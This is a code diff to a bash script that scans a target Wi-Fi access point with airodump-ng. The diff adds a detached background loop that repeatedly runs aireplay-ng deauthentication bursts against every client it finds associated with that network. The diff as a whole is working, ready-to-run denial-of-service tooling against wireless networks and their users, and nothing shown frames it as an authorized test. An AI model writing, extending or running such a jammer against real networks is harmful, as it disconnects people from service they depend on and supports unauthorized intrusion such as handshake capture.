@@ -49,16 +49,22 @@ DEAUTH_LOG=""
 TOT_DEAUTH_COUNT_FILE=""
 CH_DEAUTH_COUNT_FILE=""
 STATUS_FILE=""
+CLIENTS_FILE=""
 
 SCAN_TIMEOUT=20      # seconds (full scan)
 QUICK_CONFIRM=5      # seconds (if we have a channel hint)
 SLEEP_BETWEEN=0.5
+CLIENT_ROUND_SECS=60
+CLIENT_CMD_TIMEOUT=10
+CLIENT_DEAUTH_COUNT=5
 
 # PIDs / PGIDs
 DEAUTH_PGID=""
 DEAUTH_PID=""
 DEAUTH_MON_PGID=""
 DEAUTH_MON_PID=""
+CLIENT_LOOP_PGID=""
+CLIENT_LOOP_PID=""
 SCAN_PGID=""
 SCAN_PID=""
 TITLE_PID=""
@@ -164,9 +170,12 @@ kill_pid_only() {
 cleanup_once() {
   [[ "${_CLEANED_ONCE}" -eq 1 ]] && return 0
   _CLEANED_ONCE=1
+  local client_broom=""
+  [[ -n "${INTERFACE:-}" ]] && client_broom="aireplay-ng .* -c .* ${INTERFACE}"
   echo "[*] Cleaning up and exiting..."
   [[ -n "$TITLE_PID"      ]] && kill_pid_only "$TITLE_PID"
   [[ -n "$STOP_WATCH_PID" ]] && kill_pid_only "$STOP_WATCH_PID"
+  kill_group_strong "$CLIENT_LOOP_PGID" "$CLIENT_LOOP_PID" "$client_broom"
   kill_group_strong "$DEAUTH_MON_PGID" "$DEAUTH_MON_PID" "tail -F ${DEAUTH_LOG:-/dev/null}"
   kill_group_strong "$DEAUTH_PGID"     "$DEAUTH_PID"     "aireplay-ng .* ${INTERFACE:-}"
   kill_group_strong "$SCAN_PGID"       "$SCAN_PID"       "airodump-ng .* -w ${CSV_PREFIX:-/tmp/nowhere}"
@@ -290,6 +299,42 @@ parse_csv_for_ap() {
   ' "$csv"
 }
 
+parse_csv_for_clients() {
+  # args: csv_file, want_bssid
+  # prints: "STATION_MAC" (one per line)
+  local csv="$1" want_bssid="$2"
+  [[ -f "$csv" ]] || return 1
+  awk -F',' -v WB="$(uppercase_mac "$want_bssid")" '
+    function trim(x){ gsub(/^[ \t]+|[ \t]+$/, "", x); return x }
+    BEGIN { in_sta=0 }
+    $1 ~ /^Station MAC$/  { in_sta=1; next }
+    in_sta {
+      sta = toupper(trim($1));
+      b   = toupper(trim($6));
+      if (sta == "") next
+      if (WB != "" && b == toupper(WB)) print sta
+    }
+  ' "$csv"
+}
+
+update_clients_from_csv() {
+  # args: csv_file, bssid
+  local csv="$1" bssid="$2"
+  [[ -z "$CLIENTS_FILE" ]] && return 0
+  if [[ -z "$bssid" || ! -f "$csv" ]]; then
+    : > "$CLIENTS_FILE"
+    return 0
+  fi
+  local tmp="${CLIENTS_FILE}.tmp"
+  parse_csv_for_clients "$csv" "$bssid" | sort -u > "$tmp"
+  mv -f "$tmp" "$CLIENTS_FILE"
+}
+
+clear_clients_file() {
+  [[ -z "$CLIENTS_FILE" ]] && return 0
+  : > "$CLIENTS_FILE"
+}
+
 # --------------------- Scanner (airodump-ng) ---------------------
 run_airodump_until_found() {
   # echos:
@@ -368,7 +413,82 @@ iw_set_channel() {
 }
 
 # ---------------- Deauth control + log monitor -------------------
+stop_client_deauth_loop() {
+  if [[ -n "$CLIENT_LOOP_PGID" || -n "$CLIENT_LOOP_PID" ]]; then
+    local broom=""
+    [[ -n "${INTERFACE:-}" ]] && broom="aireplay-ng .* -c .* ${INTERFACE}"
+    echo "[*] Stopping client deauth loop..."
+    kill_group_strong "$CLIENT_LOOP_PGID" "$CLIENT_LOOP_PID" "$broom"
+    CLIENT_LOOP_PGID=""; CLIENT_LOOP_PID=""
+  fi
+}
+
+start_client_deauth_loop() {
+  # args: iface, bssid
+  local ifc="$1" bssid="$2"
+  [[ -z "$CLIENTS_FILE" ]] && return 0
+  stop_client_deauth_loop
+
+  _SPAWNING=1
+  # shellcheck disable=SC2016
+  setsid bash -c '
+    set -euo pipefail
+    ifc="$1"; bssid="$2"; clients_file="$3"; deauth_count="$4"; round_secs="$5"; cmd_timeout="$6"
+
+    run_client_once() {
+      local client="$1" ifc="$2" bssid="$3" count="$4" timeout_s="$5"
+      aireplay-ng --deauth "$count" -a "$bssid" -c "$client" "$ifc" >/dev/null 2>&1 &
+      local pid=$!
+      (
+        sleep "$timeout_s"
+        kill -INT  "$pid" 2>/dev/null || true
+        sleep 0.05
+        kill -TERM "$pid" 2>/dev/null || true
+        sleep 0.05
+        kill -KILL "$pid" 2>/dev/null || true
+      ) &
+      local killer=$!
+      wait "$pid" 2>/dev/null || true
+      kill -INT  "$killer" 2>/dev/null || true
+      kill -TERM "$killer" 2>/dev/null || true
+      kill -KILL "$killer" 2>/dev/null || true
+    }
+
+    while true; do
+      round_start="$(date +%s)"
+      clients=()
+      if [[ -f "$clients_file" ]]; then
+        while IFS= read -r c; do
+          [[ -n "$c" ]] && clients+=( "$c" )
+        done < "$clients_file"
+      fi
+
+      pids=()
+      for c in "${clients[@]}"; do
+        run_client_once "$c" "$ifc" "$bssid" "$deauth_count" "$cmd_timeout" &
+        pids+=( "$!" )
+      done
+
+      for p in "${pids[@]}"; do
+        wait "$p" 2>/dev/null || true
+      done
+
+      round_end="$(date +%s)"
+      elapsed=$((round_end - round_start))
+      if (( elapsed < round_secs )); then
+        sleep $((round_secs - elapsed))
+      fi
+    done
+  ' -- "$ifc" "$bssid" "$CLIENTS_FILE" "$CLIENT_DEAUTH_COUNT" "$CLIENT_ROUND_SECS" "$CLIENT_CMD_TIMEOUT" >/dev/null 2>&1 &
+  CLIENT_LOOP_PID="$!"
+  local realpg; realpg="$(get_pgid "$CLIENT_LOOP_PID")"
+  CLIENT_LOOP_PGID="-$CLIENT_LOOP_PID"; [[ -n "$realpg" ]] && CLIENT_LOOP_PGID="-$realpg"
+  _SPAWNING=0
+}
+
 stop_deauth() {
+  stop_client_deauth_loop
+  clear_clients_file
   if [[ -n "$DEAUTH_MON_PGID" || -n "$DEAUTH_MON_PID" ]]; then
     kill_group_strong "$DEAUTH_MON_PGID" "$DEAUTH_MON_PID" "tail -F ${DEAUTH_LOG}"
     DEAUTH_MON_PGID=""; DEAUTH_MON_PID=""
@@ -433,6 +553,7 @@ start_deauth() {
 
   CURRENT_CH="$ch"
   CURRENT_BSSID="$bssid"
+  start_client_deauth_loop "$ifc" "$bssid"
   echo "[*] Deauth started on ch $CURRENT_CH for $CURRENT_BSSID"
   write_status
 }
@@ -481,8 +602,10 @@ DEAUTH_LOG="${INSTANCE_DIR}/aireplay.log"
 TOT_DEAUTH_COUNT_FILE="${INSTANCE_DIR}/deauth.total"
 CH_DEAUTH_COUNT_FILE="${INSTANCE_DIR}/deauth.ch"
 STATUS_FILE="${INSTANCE_DIR}/status.env"
+CLIENTS_FILE="${INSTANCE_DIR}/clients.list"
 echo 0 > "$TOT_DEAUTH_COUNT_FILE"
 echo 0 > "$CH_DEAUTH_COUNT_FILE"
+: > "$CLIENTS_FILE"
 write_status
 
 echo "[INIT] Instance dir: $INSTANCE_DIR"
@@ -554,6 +677,10 @@ while true; do
         stop_deauth
         start_deauth "$INTERFACE" "$KNOWN_BSSID" "$KNOWN_CH" || true
       fi
+    fi
+    csv_file="$(latest_csv || true)"
+    if [[ -n "$csv_file" && -n "$KNOWN_BSSID" ]]; then
+      update_clients_from_csv "$csv_file" "$KNOWN_BSSID"
     fi
     write_status
 
